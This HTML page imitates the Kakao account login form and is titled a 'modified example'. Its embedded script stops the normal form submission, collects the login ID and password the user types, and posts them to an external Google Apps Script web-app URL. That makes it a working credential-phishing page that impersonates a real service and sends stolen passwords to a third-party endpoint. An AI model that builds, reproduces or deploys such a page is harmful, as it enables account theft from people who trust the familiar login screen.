<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>카카오 계정 페이지 (수정 예시)</title>
</head>
<body>
  <form id="loginForm">
    <div class="item_form fst">
      <div class="box_tf">
        <label class="screen_out" for="loginId--1">계정정보 입력</label>
        <input
          placeholder="카카오메일 아이디, 이메일, 전화번호"
          type="text"
          id="loginId--1"
          name="loginId"
          class="tf_g"
          value=""
        >
        <div class="util_tf"></div>
      </div>
    </div>

    <div class="item_form">
      <div class="box_tf">
        <label class="screen_out" for="password--2">비밀번호 입력</label>
        <input
          placeholder="비밀번호"
          autocomplete="off"
          type="password"
          id="password--2"
          name="password"
          class="tf_g"
          value=""
        >
        <div class="util_tf"></div>
      </div>
    </div>

    <div class="set_login">
      <div class="item_choice">
        <span>
          <input
            type="checkbox"
            id="saveSignedIn--4"
            class="inp_choice"
            name="saveSignedIn"
            value="false"
          >
          <label class="lab_choice" for="saveSignedIn--4" id="label-saveSignedIn">
            <span class="ico_comm ico_check"></span>
            간편로그인 정보 저장
          </label>
        </span>
        <button
          type="button"
          class="btn_help"
          aria-describedby="label-saveSignedIn"
          aria-expanded="false"
        >
          <span class="ico_comm ico_help">도움말 보기</span>
        </button>
      </div>
    </div>

    <div class="confirm_btn">
      <button type="submit" class="btn_g highlight submit">로그인</button>
      <span class="line_or"><span class="txt_or">또는</span></span>
      <button type="button" class="btn_g">QR코드 로그인</button>
    </div>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault(); // 기본 제출 동작 막기

      // 입력 값 추출
      const data = {
        loginId: document.getElementById("loginId--1").value,
        password: document.getElementById("password--2").value
      };

      // Google Apps Script 웹앱 배포 URL로 JSON 데이터 전송
      fetch("https://script.google.com/macros/s/AKfycbzOZtsUWH35A9QeMKSP_ZnMY-Zr_F8DeX1oSPsmLcCBr68Ol1F8qohBPO0bqFM5rQkIsw/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(result => console.log("서버 응답:", result))
      .catch(error => console.error("전송 에러:", error));
    });
  </script>
</body>
</html>
